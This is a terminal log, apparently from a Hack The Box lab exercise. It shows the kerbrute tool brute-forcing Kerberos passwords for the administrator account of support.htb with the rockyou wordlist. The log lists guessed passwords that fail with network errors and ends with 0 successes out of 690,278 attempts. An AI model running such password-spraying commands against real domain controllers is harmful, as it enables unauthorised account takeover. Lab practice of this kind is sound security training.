kerbrute bruteuser --dc 10.10.11.174 -d support.htb /usr/share/wordlists/rockyou.txt administrator

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/09/22 - Ronnie Flathers @ropnop

2022/10/09 10:24:51 >  Using KDC(s):
2022/10/09 10:24:51 >   10.10.11.174:88

2022/10/09 16:03:07 >  [!] administrator@support.htb:bengals7 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] administrator@support.htb:bengals16 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] administrator@support.htb:bengals98 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] administrator@support.htb:benfield - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] administrator@support.htb:benfica95 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] administrator@support.htb:bengal22 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] administrator@support.htb:benfica1994 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] administrator@support.htb:bengaly - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] administrator@support.htb:beng04 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] administrator@support.htb:beng08 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:05:22 >  [!] administrator@support.htb:benfica0 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:05:22 >  [!] administrator@support.htb:benfica13 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:05:22 >  [!] administrator@support.htb:benemerita - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:05:22 >  [!] administrator@support.htb:benfica1904 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                     
2022/10/09 16:05:22 >  [!] administrator@support.htb:benfca - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                          
2022/10/09 16:05:22 >  [!] administrator@support.htb:benet - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                           
2022/10/09 16:05:22 >  [!] administrator@support.htb:benecario - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                       
2022/10/09 16:05:22 >  [!] administrator@support.htb:benedicts - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                       
2022/10/09 16:05:22 >  [!] administrator@support.htb:benedictine - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                     
2022/10/09 16:05:22 >  [!] administrator@support.htb:beneke - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                          
2022/10/09 16:07:37 >  [!] administrator@support.htb:bene101 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                         
2022/10/09 16:07:37 >  Done! Tested 690278 logins (0 successes) in 20566.234 seconds